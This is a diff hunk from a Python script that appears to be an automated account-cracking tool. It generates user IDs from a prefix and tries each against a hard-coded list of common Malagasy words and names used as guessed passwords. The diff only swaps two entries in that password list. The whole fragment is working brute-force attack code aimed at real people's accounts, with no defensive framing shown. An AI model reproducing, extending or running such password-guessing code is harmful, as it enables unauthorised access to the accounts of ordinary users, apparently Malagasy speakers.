@@ -443,7 +443,7 @@ def pak():
                         linex()
                         for psx in user:
                                 ids = code+psx
-                                passlist = [psx,ids,'fitiavana','malala','mamako','vadiko','niaina','nirina','sarobidy','randria','faniry','ravaka','fifalina','nantenaina','tantely','tsiresy','nomena','tahiry','tanjona','mamiko','rakoto','malalako','faneva','fanomezana','tantely','sarika','papako','milely','fanantenana','valisoa','lalatiana','niaina','faniry','nilaina','mihary','tahina','fitahina','fifaliana','fitahiana','anjara']
+                                passlist = [psx,ids,'fitiavana','malala','mamako','vadiko','niaina','nirina','sarobidy','randria','faniry','ravaka','faneva','nantenaina','tantely','tsiresy','nomena','tahiry','tanjona','mamiko','rakoto','malalako','harena','fanomezana','tantely','sarika','papako','milely','fanantenana','valisoa','lalatiana','niaina','faniry','nilaina','mihary','tahina','fitahina','fifaliana','fitahiana','anjara']
                                 ennic.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
